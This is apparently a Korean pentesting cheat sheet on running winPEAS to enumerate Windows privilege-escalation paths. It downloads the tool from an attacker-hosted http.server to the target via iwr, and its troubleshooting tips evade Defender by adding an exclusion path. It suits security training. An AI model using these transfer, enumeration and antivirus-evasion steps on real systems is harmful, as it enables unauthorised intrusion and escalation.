# winPEAS — Windows 권한 상승 자동 점검

- winPEAS — Windows 권한 상승 벡터를 자동 점검하는 열거 도구. 서비스 설정·자동실행·크리덴셜·패치·프로세스 권한까지 한 번에 긁어 색상으로 위험도를 표시한다.
- Windows 셸 확보 후 whoami /priv 같은 수동 확인으로 경로가 안 보일 때, 점검 누락을 줄이기 위해 전체 열거를 한 번에 수행할 때.
- Kali에 peass 패키지(/usr/share/peass) 또는 GitHub 릴리스 필요. 타깃 전송은 http.server + iwr 조합, 실행은 cmd.exe에서 exe를 직접 호출한다.

## 1. 준비 (Kali)

```bash
# peass 패키지
sudo apt update && sudo apt install peass
ls /usr/share/peass/

# 또는 최신 릴리스 직접 다운로드
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
```

## 2. 전송 (http.server + iwr)

```bash
# 공격자 — winPEASany.exe가 있는 디렉터리에서
python3 -m http.server 80
```

```powershell
# 타깃
iwr -uri http://192.168.45.227/winPEASany.exe -Outfile winPEASany.exe
```

- -OutFile 경로는 현재 디렉터리로 두어도 되고 C:\Temp로 지정해도 된다. 쓰기 권한이 있는 곳을 쓴다.

## 3. 실행 (타깃)

```powershell
.\winPEASany.exe
```

- cmd.exe 프롬프트에서 실행하면 된다. PowerShell에서도 동일하다.
- 출력이 길다면 파일로 남겨 천천히 본다.

```powershell
.\winPEASany.exe > C:\Temp\winpeas_out.txt
# 또는 도움말·모듈 선택
.\winPEASany.exe -h
```

## 4. 출력 읽는 순서

```text
1. 빨간색/YELLOW 항목 우선 — 서비스 취약 권한, 항상상승(AlwaysInstallElevated),
   자격증명(자동로그인, 저장된 패스워드), 등록된 파일 실행 경로
2. "Windows Services" 섹션 — 수정 가능한 서비스 바이너리 경로, 언인토크 경로
3. "Applications Information" — AlwaysInstallElevated 레지스트리
4. "Scheduled Tasks" — 예약 작업 실행 파일 쓰기 가능 여부
5. "Loaded DLLs" / PATH — DLL 하이재킹 후보
6. Credentials 섹션 — 저장된 자격증명, LSASS 보호 설정
```

- 색상은 콘솔이 ANSI를 지원해야 보인다. PowerShell·cmd 기본은 지원한다.

## 5. 발견된 경로 → 수동 검증

winPEAS는 후보를 나열할 뿐 실제 상승은 수동 확인이 필요하다.

```powershell
# 서비스 권한 확인 예
accesschk.exe /accepteula -uwcqv <user> <서비스명>
sc qc <서비스명>

# AlwaysInstallElevated 확인
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## 실행 환경 주의

```text
- x64 타깃 -> winPEASany.exe (기본)
- x86 타깃 -> winPEASx86.exe
- .NET 없는 환경 -> winPEASbat (배치 버전)
```

## 트러블슈팅

- Defender가 exe를 격리하면 iwr로 재전송을 반복하기 어렵다. PowerShell 업그레이드 셸에서 Add-MpPreference -ExclusionPath 'C:\Temp'를 시도하거나, bat 버전(winPEASbat)을 쓴다.
- 실행이 즉시 끊기면 AV가 프로세스를 죽이는 것이다. winPEASbat 또는 수동 열거(powershell_privilege_escalation.md)로 전환한다.
- 출력에서 빨간 줄이 아무것도 없으면 서비스·자동실행 계열은 정상이라는 뜻이다. 크리덴셜·레지스트리 섹션과 whoami /priv 수동 점검으로 넘어간다.
- 전송 실패는 아웃바운드 문제가 대부분이다. http.server 포트를 8080으로 바꿔 재시도한다.
- 관련 문서: windows/privileges/overview.md (특권 판정), windows/powershell/invoke_webrequest.md (전송)
